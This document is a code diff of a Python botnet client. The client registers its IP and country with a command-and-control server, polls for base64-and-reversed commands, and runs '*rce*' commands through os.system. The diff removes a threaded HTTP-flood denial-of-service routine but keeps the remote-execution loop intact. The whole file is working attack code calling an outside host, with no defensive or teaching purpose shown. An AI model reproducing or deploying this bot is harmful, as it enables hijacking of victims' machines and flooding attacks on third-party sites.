@@ -1,20 +1,13 @@
-######################
-# WIP
-######################
-import base64
-import time
-import requests
-import os
+# imports
+import base64, time, requests, os
 from os import system, name
-import json
-import html
-import threading
-import random
-import sys
+import json, html, threading, random, sys
 
-cnc_server = "https://net.cloudcant.repl.co"
+# setting the cnc server
+cnc_server = 'https://net.cloudcant.repl.co'
 
 
+# getting bot ip
 def getinfo(type):
   response = requests.get('http://ifconfig.net/json')
   infojson = html.unescape(response.text)
@@ -23,18 +16,20 @@ def getinfo(type):
 
 
 botinfo = f"{getinfo('ip')}@{getinfo('country')}"
+
+# sending bot info
 requests.get(f"{cnc_server}/bot?connect={botinfo}")
 
 
+# clear the console supporting cross platform
 def clear():
-  # for windows
-  if name == 'nt':
-    _ = system('cls')
-  # for mac and linux(here, os.name is 'posix')
+  if name == "nt":
+    _ = system("cls")
   else:
-    _ = system('clear')
+    _ = system("clear")
 
 
+# encode input with base64
 def b64_encode(input):
   input_ascii = input.encode("ascii")
   input_b64_raw = base64.b64encode(input_ascii)
@@ -42,6 +37,7 @@ def b64_encode(input):
   return input_b64
 
 
+# decode base64 input
 def b64_decode(string):
   string_ascii = string.encode("ascii")
   string_decoded_raw = base64.b64decode(string_ascii)
@@ -49,10 +45,12 @@ def b64_decode(string):
   return string_decoded
 
 
+# reverse input
 def reverse(input):
   return input[::-1]
 
 
+# full encode
 def encode(string):
   step1 = b64_encode(string)
   step2 = reverse(step1)
@@ -60,6 +58,7 @@ def encode(string):
   return output
 
 
+# full decode
 def decode(string):
   step4 = b64_decode(string)
   step5 = reverse(step4)
@@ -67,6 +66,7 @@ def decode(string):
   return output
 
 
+# gettingn the command from the cnc server
 def getcommand():
   global cnc_server
   cnc = requests.get(f"{cnc_server}/bot")
@@ -74,12 +74,14 @@ def getcommand():
   return command
 
 
+# getting the if toggle
 def getcheck():
   cnc_check = requests.get(f"{cnc_server}/bot?check")
   check = html.unescape(cnc_check.text)
   return check
 
 
+# logs
 def log(check):
   global command
   command = getcommand()
@@ -91,70 +93,46 @@ def log(check):
   │   └── {decode(command)}
   ├── {cnc_server}/bot?check
   │   ├── {encode(check)}
-  │   └── {check}\n""")
+  │   └── {check}
+""")
 
 
+# denial of service example
 def dos(host, reqs, threadc):
   print(f"""
   {botinfo}
   ├── DOS
   │   ├── {host}
   │   ├── {reqs}
-  │   └── {threadc}\n""")
-
-  t = 0
-  threadcount = 0
-  threads = int(threadc)
-  views = int(reqs)
-  sendurl = str(host)
-
-  def main():
-    reqcount = round(views / threads)
-    URL = "https://raw.githubusercontent.com/cloudcant/useragents/main/Useragents.txt"
-    response = requests.get(URL)
-    open("Useragents.txt", "wb").write(response.content)
-    lines = open('Useragents.txt').read().splitlines()
-    myline = random.choice(lines)
-
-    user_agent = {'User-agent': myline}
-    print(f"> Loaded UserAgent On Thread")
-    i = 0
-    sent = 0
-
-    while i < (views / threads):
-      i = i + 1
-      sent = sent + 1
-      reqcount = reqcount
-      response = requests.get(sendurl, headers=user_agent)
-      print(
-        f"> Thread | Target Requests: {views} | Current Thread Requests: {sent}/{reqcount} "
-      )
-
-  if t == 0:
-    for i in range(threads):
-      threading.Thread(target=main).start()
-      threadcount = threadcount + 1
-      print(f"> Thread loaded | {threadcount}/{threads}")
-
-  print(f"> {threads} Threads Loaded")
+  │   └── {threadc}
+""")
 
 
+# main process loop
 while True:
+  # getting if toggled
   status = decode(getcheck())
-  if status == "listen":
-    log("Listen")
-    if "*rce*" in decode(command):
-      os.system(str((decode(command)).replace('*rce*', '')))
-    elif "*dos*" in decode(command):
-      host, reqs, threads = (str((decode(command)).replace('*dos*',
-                                                           ''))).split("::")
+  # if toggle is set to listen
+  if status == 'listen':
+    log('Listen')
+    # checks command type
+    if '*rce*' in decode(command):
+      os.system(str(decode(command).replace('*rce*', '')))
+    elif '*dos*' in decode(command):
+      host, reqs, threads = str(decode(command).replace('*dos*',
+                                                        '')).split('::')
       dos(host, reqs, threads)
+    elif "*print*" in decode(command):
+      print(str(decode(command).replace('*print*', '')))
+    # if the command has nothing in it pass
     else:
       pass
     time.sleep(2)
-  elif status == "off":
-    log("Off")
+  # else if toggle is set to off
+  elif status == 'off':
+    log('Off')
     time.sleep(2)
+  # else than log err
   else:
-    log("err")
+    log('err')
     time.sleep(2)
